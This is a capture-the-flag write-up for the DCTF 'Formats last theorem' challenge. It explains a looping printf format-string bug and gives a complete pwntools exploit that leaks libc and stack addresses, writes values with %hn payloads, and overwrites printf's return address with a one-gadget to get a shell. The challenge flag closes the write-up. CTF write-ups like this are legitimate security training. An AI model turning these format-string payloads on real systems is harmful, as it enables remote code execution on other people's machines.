# Formats last theorem

I dare you to hook the malloc
nc dctf-chall-formats-last-theorem.westeurope.azurecontainer.io 7482

## Challenge

Format string vulnerability in an infinite loop.

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

### Format String Vulnerability

```c
void sym.vuln(void)
{
    int64_t in_FS_OFFSET;
    char *format;
    int64_t var_8h;
    
    var_8h = *(int64_t *)(in_FS_OFFSET + 0x28);
    do {
        sym.imp.puts(0x858);
        sym.imp.__isoc99_scanf(0x8a1, &format);
        sym.imp.puts(0x8a7);
        sym.imp.printf(&format);
        sym.imp.puts(0x8b3);
        sym.imp.puts(0x8b3);
    } while( true );
}
```

## Solution

We can start by leaking addresses off the stack to find the address of the stack and the base address of libc.

With this information, we know where to overwrite and we can find a one-gadget to jump to.
One of the one-gadgets requires that `[rsp+0x70]` is null, which we can set by overwriting this stack variable using `printf`.

With the constraint met, we can exit the infinite loop by overwriting the return address of `printf` with the address of the one-gadget.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host dctf-chall-formats-last-theorem.westeurope.azurecontainer.io --port 7482 formats_last_theorem
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('formats_last_theorem')
libc=ELF('libc6_2.27-3ubuntu1.4_amd64.so')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'dctf-chall-formats-last-theorem.westeurope.azurecontainer.io'
port = int(args.PORT or 7482)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

def leak(offset):
    io.recvuntil("point\n")
    io.sendline("%{}$p".format(offset // 8 + 6))
    io.recvuntil("entered\n")
    return int(io.recvuntil("\n", drop=True), 0)

def write(addr, content):
    content0 = content % 0x10000
    content1 = content % 0x100000000 // 0x10000
    content2 = content % 0x1000000000000 // 0x100000000
    content3 = content // 0x1000000000000

    payload0 = ''
    payload0 += "%{}c".format(content0)
    payload0 += "%14$hn"
    payload0 += "%{}c".format((content1 - content0) % 0x10000)
    payload0 += "%15$hn"
    payload0 += "%{}c".format((content2 - content1) % 0x10000)
    payload0 += "%16$hn"
    payload0 += "%{}c".format((content3 - content2) % 0x10000)
    payload0 += "%17$hn"

    payload1 = ''
    payload1 += p64(addr)
    payload1 += p64(addr + 2)
    payload1 += p64(addr + 4)
    payload1 += p64(addr + 6)

    payload = flat({
        0: payload0,
        0x40: payload1,
        })

    io.recvuntil("point\n")
    io.sendline(payload)

def zero(addr):
    payload = flat({
        0: "%7$ln",
        0x8: addr,
        })

    io.recvuntil("point\n")
    io.sendline(payload)

io = start()

libc.address = leak(0x88) - 0x021bf7
io.success(hex(libc.address))

stack = leak(0x70)
rip = stack - (0x7fffffffe300 - 0x7fffffffe278)
rsp0x70 = stack - (0x7fffffffe300 - 0x7fffffffe2f0)
io.success(hex(stack))

target = libc.address + 0x10a41c
io.info(hex(target))

zero(rsp0x70)

write(rip, target)

io.interactive()
```

## Flag

`dctf{N0t_all_7h30r3ms_s0und_g00d}`

